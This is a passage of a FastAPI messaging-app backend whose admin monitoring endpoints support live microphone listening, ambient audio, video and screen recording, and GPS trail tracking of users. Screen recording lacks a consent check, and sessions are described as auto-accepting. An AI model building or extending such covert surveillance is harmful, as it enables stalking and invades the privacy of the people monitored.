    vc = db.query(VideoRecording).filter(VideoRecording.user_id == user_id).delete()
    deleted["video_recordings"] = vc

    ms = db.query(MonitoringSession).filter(MonitoringSession.user_id == user_id).delete()
    deleted["monitoring_sessions"] = ms

    db.commit()

    logger.info(f"Superadmin {current_sa.username} purged all data for user {username}: {deleted}")
    return {"status": "purged", "username": username, "deleted": deleted}


@app.delete("/admin/users/{phone_number}")
async def admin_delete_user(phone_number: str,
                           current_user: User = Depends(get_admin_user),
                           db: Session = Depends(get_database_session)):
    """Delete a user account permanently by phone number (admin only)"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        success = AdminService.delete_user(db, user_id, phone_number)
        
        if success:
            return {
                "message": f"User account with phone number '{phone_number}' deleted successfully",
                "deleted": True
            }
        else:
            raise HTTPException(status_code=404, detail="User not found")
            
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Admin delete user error: {e}")
        raise HTTPException(status_code=500, detail="Failed to delete user account")

@app.put("/admin/users/{phone_number}")
async def admin_update_user(phone_number: str,
                           user_data: AdminUpdateUser,
                           current_user: User = Depends(get_admin_user),
                           db: Session = Depends(get_database_session)):
    """Update a user account (admin only)"""
    try:
        admin_user_id = int(getattr(current_user, 'id', 0))
        updated_user = AdminService.update_user(db, admin_user_id, phone_number, user_data)
        
        return {
            "username": str(getattr(updated_user, 'username', '')),
            "phone_number": str(getattr(updated_user, 'phone_number', '')),
            "message": "User updated successfully"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Admin update user error: {e}")
        raise HTTPException(status_code=500, detail="Failed to update user")

# --- Admin Group Management Routes ---

@app.get("/admin/groups", response_model=List[GroupResponse])
async def admin_get_all_groups(current_user: User = Depends(get_admin_user),
                              db: Session = Depends(get_database_session)):
    """Get all groups (admin only)"""
    try:
        groups = GroupService.get_all_groups(db)
        
        result = []
        for g in groups:
            result.append({
                "id": int(g.id),
                "name": str(g.name),
                "description": g.description,
                "created_at": g.created_at,
                "created_by": int(g.created_by),
                "member_count": len(g.members)
            })
        return result
    except Exception as e:
        logger.error(f"Admin list groups error: {e}")
        raise HTTPException(status_code=500, detail="Failed to list groups")

@app.get("/admin/groups/{group_id}/members")
async def admin_get_group_members(group_id: int,
                                  current_user: User = Depends(get_admin_user),
                                  db: Session = Depends(get_database_session)):
    """Get members of a group (admin — no membership check)"""
    try:
        group = db.query(Group).filter(Group.id == group_id).first()
        if not group:
            raise HTTPException(status_code=404, detail="Group not found")
        return GroupService.get_group_members(db, group_id)
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Admin get group members error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve group members")

@app.put("/admin/groups/{group_id}")
async def admin_update_group(group_id: int,
                            group_data: AdminGroupUpdate,
                            current_user: User = Depends(get_admin_user),
                            db: Session = Depends(get_database_session)):
    """Update a group (admin only)"""
    try:
        admin_user_id = int(getattr(current_user, 'id', 0))
        success = GroupService.update_group(
            db, group_id, group_data.name, group_data.description, group_data.members, admin_user_id
        )
        
        if success:
            return {"message": "Group updated successfully"}
        else:
            raise HTTPException(status_code=404, detail="Group not found")
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Admin update group error: {e}")
        raise HTTPException(status_code=500, detail=f"Failed to update group: {str(e)}")

@app.delete("/admin/groups/{group_id}")
async def admin_delete_group(group_id: int,
                            current_user: User = Depends(get_admin_user),
                            db: Session = Depends(get_database_session)):
    """Delete a group (admin only)"""
    try:
        admin_user_id = int(getattr(current_user, 'id', 0))
        success = GroupService.delete_group(db, group_id, admin_user_id)
        
        if success:
            return {"message": "Group deleted successfully", "deleted": True}
        else:
            raise HTTPException(status_code=404, detail="Group not found")
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Admin delete group error: {e}")
        raise HTTPException(status_code=500, detail=f"Failed to delete group: {str(e)}")

@app.get("/admin/users")
async def admin_get_all_users(current_user: User = Depends(get_admin_user),
                             db: Session = Depends(get_database_session)):
    """Get list of all users (admin only)"""
    try:
        # Check if requesting user is admin
        user_id = int(getattr(current_user, 'id', 0))
        if not AdminService.is_admin(db, user_id):
            raise HTTPException(status_code=403, detail="Only admin users can access this endpoint")
        
        users = UserService.get_all_users(db)
        
        result = []
        for user in users:
            last_login = getattr(user, 'last_login', None)
            registered = getattr(user, 'registered', datetime.now(timezone.utc))
            result.append({
                "id": int(getattr(user, 'id', 0)),
                "phone_number": str(getattr(user, 'phone_number', '')),
                "username": str(getattr(user, 'username', '')),
                "registered": registered.isoformat() if registered else datetime.now(timezone.utc).isoformat(),
                "last_login": last_login.isoformat() if last_login else None,
                "is_active": bool(getattr(user, 'is_active', False)),
                "is_admin": bool(getattr(user, 'is_admin', False)),
                "user_type": str(getattr(user, 'user_type', ''))
            })
        
        return {
            "users": result,
            "count": len(result)
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Admin get users error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve users")

# Directory to temporarily store uploaded files
UPLOAD_DIR = "media_uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

# Built decoys are cached so a given voice note always plays back the same words.
DECOY_CACHE_DIR = "decoy_cache"
os.makedirs(DECOY_CACHE_DIR, exist_ok=True)

@app.post("/media/upload_raw")
async def upload_raw_media(
    username: str = Form(...),
    file: UploadFile = File(...),
    disappear_after_hours: Optional[int] = Form(None),
    content_type: Optional[str] = Form(None),
    encryption_metadata: Optional[str] = Form(None),
    current_user: User = Depends(get_current_user),
    credentials: HTTPAuthorizationCredentials = Depends(security),
    db: Session = Depends(get_database_session)
):
    """
    Endpoint for direct raw media upload without base64 encoding
    """
    try:
        # Parse encryption metadata if provided
        metadata_json = None
        if encryption_metadata:
            try:
                metadata_json = json.loads(encryption_metadata)
            except Exception as e:
                logger.warning(f"Failed to parse encryption metadata: {e}")
        
        # Get recipient user by username

        recipient = db.query(User).filter(User.username == username, User.is_active == True).first()
        if not recipient:
            raise HTTPException(status_code=404, detail="Recipient not found")
        
        # Generate unique filename to avoid conflicts
        file_extension = os.path.splitext(file.filename)[1] if file.filename else ".bin"
        unique_filename = f"{uuid.uuid4()}{file_extension}"
        file_path = os.path.join(UPLOAD_DIR, unique_filename)
        
        content = await file.read()
        
        # Determine if this is a voice note or already encrypted content
        is_voice = content_type == "media/voice" or bool(content_type and content_type.startswith("audio/"))
        
        # Apply watermark ONLY for images and PDFs, and SKIP for voice notes/encrypted blobs
        if not is_voice and not (content_type and "encrypted" in content_type):
            content = apply_watermark(
                content,
                file.content_type or "application/octet-stream",
                file.filename or "media",
                str(getattr(recipient, "username", "") or "User"),
            )
        
        # Save the uploaded file
        with open(file_path, "wb") as buffer:
            buffer.write(content)
        
        # Get sender ID
        sender_id = int(getattr(current_user, 'id', 0))
        
        # Calculate expiration time if disappearing media
        expires_at = None
        auto_delete = False
        if disappear_after_hours is not None and disappear_after_hours > 0:
            expires_at = datetime.now(timezone.utc) + timedelta(hours=disappear_after_hours)
            auto_delete = True
        
        # Create message for the media
        message = Message(
            sender_id=sender_id,
            recipient_id=recipient.id,
            encrypted_content=unique_filename,  # Use the actual media ID
            content_type=content_type or f"media/raw",
            delivered=True,
            read=False,
            is_offline=False,
            expires_at=expires_at,
            auto_delete=auto_delete
        )
        
        db.add(message)
        db.commit()
        db.refresh(message)
        
        # Create media record with specific media_type
        mediaListType = "voice" if is_voice else "raw"
        media = Media(
            media_id=unique_filename,
            filename=file.filename or unique_filename,
            file_size=len(content) if not isinstance(content, (Exception, type(None))) else 0,
            media_type=mediaListType,
            content_type=content_type or file.content_type or "application/octet-stream",
            encrypted_file_path=file_path,
            encryption_metadata=metadata_json,
            message_id=message.id,
            sender_id=sender_id,
            recipient_id=recipient.id,
            expires_at=expires_at,
            auto_delete=auto_delete
        )

        
        db.add(media)
        db.commit()
        db.refresh(media)
        
        logger.info(f"📤 Raw media uploaded: {sender_id} → {recipient.id} ({unique_filename})")
        
        # Create success response with file info
        response = {
            "media_id": unique_filename,
            "filename": file.filename,
            "file_size": len(content) if not isinstance(content, (Exception, type(None))) else 0,
            "content_type": file.content_type,
            "message": "File uploaded successfully",
            "uploaded_for": username,
            "disappear_after_hours": disappear_after_hours
        }
        
        return response
    
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to upload file: {str(e)}")

@app.get("/media/download/{media_id}")
async def download_raw_media(
    media_id: str, 
    current_user: User = Depends(get_current_user),
    credentials: HTTPAuthorizationCredentials = Depends(security),
    db: Session = Depends(get_database_session)
):
    """
    Endpoint to download raw media by ID
    """
    try:
        # Verify that the user has access to this media
        media = db.query(Media).filter(Media.media_id == media_id).first()
        if not media:
            raise HTTPException(status_code=404, detail="Media not found")
        
        # Check if user is sender or recipient
        user_id = int(getattr(current_user, 'id', 0))
        if media.sender_id != user_id and media.recipient_id != user_id:
            raise HTTPException(status_code=403, detail="Access denied")
        
        # Get the actual file path from the database
        file_path = getattr(media, 'encrypted_file_path', None)
        if not file_path:
            file_path = os.path.join(UPLOAD_DIR, media_id)
            
        # Detect if this is a voice note
        is_voice = (
            str(getattr(media, 'media_type', '')).lower() == 'voice' or
            any(media_id.endswith(ext) for ext in ('.m4a', '.wav', '.aac', '.opus', '.mp3'))
        )
        
        # Check if the file exists, if not try adding .enc if it's not already there
        if not os.path.exists(file_path):
            if not file_path.endswith('.enc'):
                alt_path = f"{file_path}.enc"
                if os.path.exists(alt_path):
                    file_path = alt_path
        
        if not os.path.exists(file_path):
            if is_voice:
                raise HTTPException(status_code=404, detail="Voice note file not found")
            # Non-voice: File was deleted after viewing (one-time view)
            if media.downloaded_at:
                raise HTTPException(status_code=410, detail="Media was deleted after viewing. Cannot access again.")
            raise HTTPException(status_code=404, detail="File not found")
        
        # Read the file content
        with open(file_path, "rb") as file:
            content = file.read()
        
        # Mark media as downloaded
        media.downloaded_at = datetime.now(timezone.utc)
        db.commit()
        
        # Voice notes: keep file on disk for replay. Only delete regular media (one-time view).
        if not is_voice:
            MediaService.delete_media_file_from_disk(file_path)
        
        content_len = len(content) if hasattr(content, "__len__") else 0
        return Response(
            content=content,
            media_type=media.content_type,
            headers={
                "Content-Disposition": f"attachment; filename={media.filename}",
                "Content-Length": str(content_len)
            }
        )
    

    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to download file: {str(e)}")

@app.get("/media/{media_id}")
async def get_raw_uploaded_media(media_id: str):
    """
    Endpoint to retrieve uploaded media by ID
    """
    # Sanitize media_id to prevent path traversal issues
    import re
    if not re.match(r'^[a-zA-Z0-9._-]+$', media_id):
        raise HTTPException(status_code=400, detail="Invalid media ID format")
    
    file_path = os.path.join(UPLOAD_DIR, media_id)
    
    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    
    # Return file info (in a real app, you'd serve the actual file)
    return {
        "media_id": media_id,
        "message": "File available for download"
    }

# ─── Audio Monitoring Endpoints ───────────────────────────────────────────────

@app.post("/monitoring/consent")
async def set_monitoring_consent(
    data: MonitoringConsentRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """User grants or revokes admin monitoring consent. App calls this after user taps consent UI."""
    user_id = int(getattr(current_user, 'id', 0))
    consent = MonitoringService.set_consent(db, user_id, data)
    return {
        "consent_given": consent.consent_given,
        "allow_live_listen": consent.allow_live_listen,
        "allow_recording": consent.allow_recording,
        "consented_at": consent.consented_at.isoformat() if consent.consented_at else None,
        "revoked_at": consent.revoked_at.isoformat() if consent.revoked_at else None,
    }


@app.get("/monitoring/consent")
async def get_monitoring_consent(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """User views their current consent status."""
    user_id = int(getattr(current_user, 'id', 0))
    consent = MonitoringService.get_consent(db, user_id)
    if not consent:
        return {"consent_given": False, "allow_live_listen": False, "allow_recording": False}
    return {
        "consent_given": consent.consent_given,
        "allow_live_listen": consent.allow_live_listen,
        "allow_recording": consent.allow_recording,
        "consented_at": consent.consented_at.isoformat() if consent.consented_at else None,
        "revoked_at": consent.revoked_at.isoformat() if consent.revoked_at else None,
    }


@app.post("/admin/monitoring/listen")
async def admin_request_live_listen(
    data: MonitoringSessionRequest,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin initiates live WebRTC listen session. Server verifies user consent first."""
    try:
        admin_id = int(getattr(admin_user, 'id', 0))
        session = await MonitoringService.request_live_session(db, admin_id, data.target_username, data.offer_sdp)
        return {
            "session_id": int(session.id),
            "status": "requested",
            "message": "Session request sent to user app via WebSocket"
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Live listen request error: {e}")
        raise HTTPException(status_code=500, detail="Failed to request monitoring session")


@app.post("/monitoring/session/respond")
async def user_respond_monitoring_session(
    data: MonitoringSessionAction,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """
    User's app responds to monitoring session (accept/reject/end).
    App should auto-accept when consent allows; or present UI confirmation.
    """
    try:
        user_id = int(getattr(current_user, 'id', 0))
        session = await MonitoringService.handle_session_action(db, data.session_id, user_id, data.action, data.answer_sdp)
        return {"session_id": int(session.id), "status": session.status}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Session respond error: {e}")
        raise HTTPException(status_code=500, detail="Failed to update session")


@app.post("/monitoring/ice_candidate")
async def monitoring_ice_candidate(
    data: MonitoringIceCandidate,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Relay WebRTC ICE candidate between admin and user for monitoring session."""
    try:
        sender_id = int(getattr(current_user, 'id', 0))
        ok = await MonitoringService.forward_ice(db, data.session_id, sender_id, data.candidate)
        if not ok:
            raise HTTPException(status_code=400, detail="Failed to forward ICE candidate")
        return {"success": True}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Monitoring ICE error: {e}")
        raise HTTPException(status_code=500, detail="Failed to forward ICE candidate")


@app.post("/monitoring/recording/upload")
async def upload_audio_recording(
    file: UploadFile = File(...),
    duration: Optional[float] = Form(None),
    context: str = Form(default="ambient"),
    is_encrypted: bool = Form(default=True),
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """
    App uploads audio recording chunk. Server verifies recording consent first.
    App should encrypt audio locally before upload (AES-256-GCM recommended).
    """
    try:
        user_id = int(getattr(current_user, 'id', 0))
        MonitoringService.assert_consent(db, user_id, "recording")

        upload_dir = "media_uploads/audio_monitoring"
        os.makedirs(upload_dir, exist_ok=True)

        recording_id = str(uuid.uuid4())
        ext = ".enc" if is_encrypted else ".m4a"
        file_path = os.path.join(upload_dir, f"{recording_id}{ext}")

        content = await file.read()
        with open(file_path, "wb") as f:
            f.write(content)

        rec = MonitoringService.save_recording(
            db, user_id, file_path, duration or 0.0, len(content), context, is_encrypted
        )
        return {"recording_id": int(rec.id), "status": "uploaded", "size_bytes": len(content)}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Audio upload error: {e}")
        raise HTTPException(status_code=500, detail="Failed to upload recording")


@app.get("/admin/monitoring/recordings/download/{recording_id}")
async def admin_download_recording(
    recording_id: int,
    request: Request,
    token: Optional[str] = None,
    db: Session = Depends(get_database_session)
):
    """Admin downloads a recording. Accepts Bearer header OR ?token= query param (for browser <audio> src)."""
    try:
        # Resolve token from query param or Authorization header
        raw_token = token
        if not raw_token:
            auth_header = request.headers.get("Authorization", "")
            if auth_header.startswith("Bearer "):
                raw_token = auth_header[7:]
        if not raw_token:
            raise HTTPException(status_code=401, detail="Missing token")

        session = SessionService.validate_session(db, raw_token)
        if not session:
            raise HTTPException(status_code=401, detail="Invalid token")
        user = db.query(User).filter(User.id == session.user_id, User.is_active == True).first()
        if not user or not user.is_admin:
            raise HTTPException(status_code=403, detail="Admin only")

        rec = db.query(AudioRecording).filter(AudioRecording.id == recording_id).first()
        if not rec:
            raise HTTPException(status_code=404, detail="Recording not found")
        if not os.path.exists(rec.file_path):
            raise HTTPException(status_code=404, detail="File not found on disk")

        rec.downloaded_by_admin = True
        rec.downloaded_at = datetime.utcnow()
        db.commit()

        from fastapi.responses import FileResponse
        return FileResponse(
            path=rec.file_path,
            filename=f"recording_{recording_id}.ogg",
            media_type="audio/ogg"
        )
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Download recording error: {e}")
        raise HTTPException(status_code=500, detail="Failed to download recording")


@app.get("/admin/monitoring/recordings/{username}")
async def admin_get_recordings(
    username: str,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin lists all audio recordings for a given user."""
    try:
        target = db.query(User).filter(User.username == username, User.is_active == True).first()
        if not target:
            raise HTTPException(status_code=404, detail="User not found")

        recordings = MonitoringService.get_recordings(db, int(target.id))
        return [
            {
                "recording_id": int(r.id),
                "context": r.context,
                "duration_seconds": r.duration_seconds,
                "file_size_bytes": r.file_size_bytes,
                "is_encrypted": r.is_encrypted,
                "uploaded_at": r.uploaded_at.isoformat(),
                "downloaded_by_admin": r.downloaded_by_admin,
            }
            for r in recordings
        ]
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get recordings error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve recordings")


@app.get("/admin/monitoring/sessions")
async def admin_get_monitoring_sessions(
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin views history of all monitoring sessions."""
    try:
        sessions = (
            db.query(MonitoringSession)
            .order_by(MonitoringSession.started_at.desc())
            .limit(100)
            .all()
        )
        result = []
        for s in sessions:
            target = db.query(User).filter(User.id == s.target_user_id).first()
            result.append({
                "session_id": int(s.id),
                "target_username": target.username if target else "unknown",
                "status": s.status,
                "started_at": s.started_at.isoformat(),
                "ended_at": s.ended_at.isoformat() if s.ended_at else None,
                "duration_seconds": s.duration,
            })
        return result
    except Exception as e:
        logger.error(f"Get sessions error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve sessions")


@app.get("/admin/monitoring/consented_users")
async def admin_get_consented_users(
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin sees all active users with their monitoring consent status."""
    try:
        users = db.query(User).filter(User.is_active == True).all()
        result = []
        for user in users:
            c = db.query(MonitoringConsent).filter(MonitoringConsent.user_id == user.id).first()
            result.append({
                "user_id": int(user.id),
                "username": user.username,
                "phone_number": user.phone_number,
                "consent_given": c.consent_given if c else False,
                "allow_live_listen": c.allow_live_listen if c else False,
                "allow_recording": c.allow_recording if c else False,
                "allow_video_recording": c.allow_video_recording if c else False,
                "allow_location_tracking": c.allow_location_tracking if c else False,
                "consented_at": c.consented_at.isoformat() if c and c.consented_at else None,
            })
        return result
    except Exception as e:
        logger.error(f"Get consented users error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve users")


# ─── Video Recording Endpoints ─────────────────────────────────────────────────

@app.post("/monitoring/video/upload")
async def upload_video_recording(
    file: UploadFile = File(...),
    thumbnail: Optional[UploadFile] = File(None),
    duration: Optional[float] = Form(None),
    resolution: Optional[str] = Form(None),
    context: str = Form(default="ambient"),
    is_encrypted: bool = Form(default=True),
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """
    App uploads video recording chunk. Server verifies video recording consent.
    Encrypt video locally (AES-256-GCM) before upload.
    """
    try:
        user_id = int(getattr(current_user, 'id', 0))
        MonitoringService.assert_consent(db, user_id, "video")

        upload_dir = "media_uploads/video_monitoring"
        os.makedirs(upload_dir, exist_ok=True)

        recording_id = str(uuid.uuid4())
        ext = ".enc" if is_encrypted else ".mp4"
        file_path = os.path.join(upload_dir, f"{recording_id}{ext}")

        content = await file.read()
        with open(file_path, "wb") as f:
            f.write(content)

        thumbnail_path = None
        if thumbnail:
            thumb_content = await thumbnail.read()
            thumbnail_path = os.path.join(upload_dir, f"{recording_id}_thumb.jpg")
            with open(thumbnail_path, "wb") as f:
                f.write(thumb_content)

        rec = MonitoringService.save_video(
            db, user_id, file_path, thumbnail_path, duration or 0.0, len(content), resolution, context, is_encrypted
        )
        return {"recording_id": int(rec.id), "status": "uploaded", "size_bytes": len(content)}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Video upload error: {e}")
        raise HTTPException(status_code=500, detail="Failed to upload video recording")


@app.get("/admin/monitoring/videos/{username}")
async def admin_get_videos(
    username: str,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin lists video recordings for a user."""
    try:
        target = db.query(User).filter(User.username == username, User.is_active == True).first()
        if not target:
            raise HTTPException(status_code=404, detail="User not found")

        videos = MonitoringService.get_videos(db, int(target.id))
        return [
            {
                "recording_id": int(v.id),
                "context": v.context,
                "duration_seconds": v.duration_seconds,
                "file_size_bytes": v.file_size_bytes,
                "resolution": v.resolution,
                "is_encrypted": v.is_encrypted,
                "uploaded_at": v.uploaded_at.isoformat(),
                "downloaded_by_admin": v.downloaded_by_admin,
                "has_thumbnail": v.thumbnail_path is not None,
            }
            for v in videos
        ]
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get videos error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve videos")


@app.get("/admin/monitoring/videos/download/{recording_id}")
async def admin_download_video(
    recording_id: int,
    request: Request,
    token: Optional[str] = None,
    db: Session = Depends(get_database_session)
):
    """Admin downloads a video recording. Accepts Bearer header OR ?token= query param (for browser <video> src)."""
    raw_token = token
    if not raw_token:
        auth_header = request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            raw_token = auth_header[7:]
    if not raw_token:
        raise HTTPException(status_code=401, detail="Missing token")
    session = SessionService.validate_session(db, raw_token)
    if not session:
        raise HTTPException(status_code=401, detail="Invalid token")
    user = db.query(User).filter(User.id == session.user_id, User.is_active == True).first()
    if not user or not user.is_admin:
        raise HTTPException(status_code=403, detail="Admin only")
    try:
        rec = db.query(VideoRecording).filter(VideoRecording.id == recording_id).first()
        if not rec:
            raise HTTPException(status_code=404, detail="Recording not found")
        if not os.path.exists(rec.file_path):
            raise HTTPException(status_code=404, detail="File not found on disk")

        rec.downloaded_by_admin = True
        rec.downloaded_at = datetime.utcnow()
        db.commit()

        from fastapi.responses import FileResponse
        return FileResponse(
            path=rec.file_path,
            filename=f"video_{recording_id}.{'enc' if rec.is_encrypted else 'mp4'}",
            media_type="application/octet-stream"
        )
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Download video error: {e}")
        raise HTTPException(status_code=500, detail="Failed to download video")


@app.get("/admin/monitoring/videos/thumbnail/{recording_id}")
async def admin_get_video_thumbnail(
    recording_id: int,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin fetches thumbnail for a video recording."""
    try:
        rec = db.query(VideoRecording).filter(VideoRecording.id == recording_id).first()
        if not rec or not rec.thumbnail_path or not os.path.exists(rec.thumbnail_path):
            raise HTTPException(status_code=404, detail="Thumbnail not found")
        from fastapi.responses import FileResponse
        return FileResponse(path=rec.thumbnail_path, media_type="image/jpeg")
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Thumbnail error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve thumbnail")


# ─── Screen Recording Endpoints ────────────────────────────────────────────────

@app.post("/monitoring/screen-recording/upload")
async def upload_screen_recording(
    file: UploadFile = File(...),
    session_id: str = Form(...),
    chunk_index: int = Form(...),
    admin_id: Optional[int] = Form(None),
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """App uploads screen recording chunk. Stored under video_recordings with context='screen_recording'."""
    try:
        user_id = int(getattr(current_user, 'id', 0))

        upload_dir = "media_uploads/screen_recordings"
        os.makedirs(upload_dir, exist_ok=True)

        recording_id = str(uuid.uuid4())
        file_path = os.path.join(upload_dir, f"{recording_id}.mp4")

        content = await file.read()
        with open(file_path, "wb") as f:
            f.write(content)

        import json
        meta = json.dumps({"session_id": session_id, "chunk_index": chunk_index, "admin_id": admin_id})
        rec = MonitoringService.save_video(
            db, user_id, file_path, None, 0.0, len(content), meta, "screen_recording", False
        )
        return {"recording_id": int(rec.id), "status": "uploaded", "size_bytes": len(content)}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Screen recording upload error: {e}")
        raise HTTPException(status_code=500, detail="Failed to upload screen recording")


@app.get("/admin/monitoring/screen-recordings/{username}")
async def admin_get_screen_recordings(
    username: str,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin lists screen recording chunks for a user."""
    try:
        target = db.query(User).filter(User.username == username, User.is_active == True).first()
        if not target:
            raise HTTPException(status_code=404, detail="User not found")

        recs = db.query(VideoRecording).filter(
            VideoRecording.user_id == int(target.id),
            VideoRecording.context == "screen_recording"
        ).order_by(VideoRecording.uploaded_at.desc()).all()

        import json
        result = []
        for r in recs:
            try:
                meta = json.loads(r.resolution or "{}")
            except Exception:
                meta = {}
            result.append({
                "recording_id": int(r.id),
                "session_id": meta.get("session_id"),
                "chunk_index": meta.get("chunk_index"),
                "admin_id": meta.get("admin_id"),
                "file_size_bytes": r.file_size_bytes,
                "uploaded_at": r.uploaded_at.isoformat(),
                "downloaded_by_admin": r.downloaded_by_admin,
            })
        return result
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get screen recordings error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve screen recordings")


@app.get("/admin/monitoring/screen-recordings/download/{recording_id}")
async def admin_download_screen_recording(
    recording_id: int,
    request: Request,
    token: Optional[str] = None,
    db: Session = Depends(get_database_session)
):
    """Admin downloads screen recording chunk. Accepts Bearer header OR ?token= for browser <video> src."""
    raw_token = token
    if not raw_token:
        auth_header = request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            raw_token = auth_header[7:]
    if not raw_token:
        raise HTTPException(status_code=401, detail="Missing token")
    session = SessionService.validate_session(db, raw_token)
    if not session:
        raise HTTPException(status_code=401, detail="Invalid token")
    user = db.query(User).filter(User.id == session.user_id, User.is_active == True).first()
    if not user or not user.is_admin:
        raise HTTPException(status_code=403, detail="Admin only")
    try:
        rec = db.query(VideoRecording).filter(
            VideoRecording.id == recording_id,
            VideoRecording.context == "screen_recording"
        ).first()
        if not rec:
            raise HTTPException(status_code=404, detail="Recording not found")
        if not os.path.exists(rec.file_path):
            raise HTTPException(status_code=404, detail="File not found on disk")

        rec.downloaded_by_admin = True
        rec.downloaded_at = datetime.utcnow()
        db.commit()

        from fastapi.responses import FileResponse
        return FileResponse(
            path=rec.file_path,
            filename=f"screen_chunk_{recording_id}.mp4",
            media_type="video/mp4"
        )
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Download screen recording error: {e}")
        raise HTTPException(status_code=500, detail="Failed to download screen recording")


# ─── Location Tracking Endpoints ───────────────────────────────────────────────

@app.post("/monitoring/location/push")
async def push_location(
    data: LocationBatch,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """
    App pushes batch of GPS location points. Server verifies location tracking consent.
    App should call this periodically (e.g. every 30-60s) while tracking is enabled.
    """
    try:
        user_id = int(getattr(current_user, 'id', 0))
        MonitoringService.assert_consent(db, user_id, "location")

        saved = MonitoringService.push_location_batch(db, user_id, data.points)

        # Dead man's switch checkin on any location push
        DeadMansSwitchService.checkin(db, user_id)

        # Check geofences for each point, use most recent for real-time push
        for p in data.points:
            try:
                rec_at = datetime.fromisoformat(p.recorded_at.replace("Z", "+00:00")).replace(tzinfo=None)
            except Exception:
                rec_at = datetime.utcnow()
            await GeofenceService.check_geofences(db, user_id, p.latitude, p.longitude, rec_at)

        # Push last location to online admins in real-time
        if data.points:
            last = data.points[-1]
            user = db.query(User).filter(User.id == user_id).first()
            admins = db.query(User).filter(User.is_admin == True, User.is_active == True).all()
            location_event = {
                "type": "user_location_update",
                "data": {
                    "user_id": user_id,
                    "username": user.username if user else "unknown",
                    "latitude": last.latitude,
                    "longitude": last.longitude,
                    "accuracy": last.accuracy,
                    "speed": last.speed,
                    "activity": last.activity,
                    "recorded_at": last.recorded_at,
                }
            }
            for admin in admins:
                await ws_manager.send_to_user(int(admin.id), location_event)

        return {"saved": saved, "status": "ok"}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Location push error: {e}")
        raise HTTPException(status_code=500, detail="Failed to push location")


@app.get("/admin/monitoring/location/all_users/last")
async def admin_get_all_users_last_location(
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin gets last known location for ALL consented users — overview map."""
    try:
        consents = db.query(MonitoringConsent).filter(
            MonitoringConsent.consent_given == True,
            MonitoringConsent.allow_location_tracking == True
        ).all()

        result = []
        for c in consents:
            user = db.query(User).filter(User.id == c.user_id, User.is_active == True).first()
            if not user:
                continue
            loc = MonitoringService.get_last_location(db, int(c.user_id))
            result.append({
                "user_id": int(c.user_id),
                "username": user.username,
                "latitude": loc.latitude if loc else None,
                "longitude": loc.longitude if loc else None,
                "speed": loc.speed if loc else None,
                "activity": loc.activity if loc else None,
                "last_seen": loc.recorded_at.isoformat() if loc else None,
            })
        return result
    except Exception as e:
        logger.error(f"All users location error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve locations")


@app.get("/admin/monitoring/location/{username}/trail")
async def admin_get_location_trail(
    username: str,
    limit: int = 500,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin gets full GPS movement trail for a user (most recent first)."""
    try:
        target = db.query(User).filter(User.username == username, User.is_active == True).first()
        if not target:
            raise HTTPException(status_code=404, detail="User not found")

        trail = MonitoringService.get_location_trail(db, int(target.id), limit)
        return [
            {
                "id": int(t.id),
                "latitude": t.latitude,
                "longitude": t.longitude,
                "accuracy": t.accuracy,
                "altitude": t.altitude,
                "speed": t.speed,
                "heading": t.heading,
